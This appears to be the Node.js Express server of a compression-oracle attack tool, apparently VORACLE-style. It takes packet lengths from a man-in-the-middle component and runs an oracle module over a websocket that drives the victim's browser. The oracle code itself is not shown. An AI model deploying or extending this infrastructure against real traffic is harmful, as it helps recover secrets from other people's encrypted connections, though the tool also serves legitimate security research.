const express = require('express')
const app = express()
const expressWs = require('express-ws')(app)

const config = require('./config.json')
let oracleLib = require('./oracle')
let oracle = null

app.use(express.static('public'))

app.get('/', (req, res) => res.send('Voracle attack server!'))

app.get('/events/mitm/length/:len', (req, res) => {
  const len = parseInt(req.params.len)
  // console.log(len)
  oracle.emit('packet_length', len)
  res.status(200)
  res.send('')
})

app.ws('/xhr-interface', (ws, req) => {
  ws.on('message', (msg) => {
    if (msg === 'start_oracle') {
      if (oracle) oracleLib.deInit(oracle)
      oracle = oracleLib.init(ws)
    }
  })
})

app.listen(config.port, () => {
  console.log('Listening!')
})
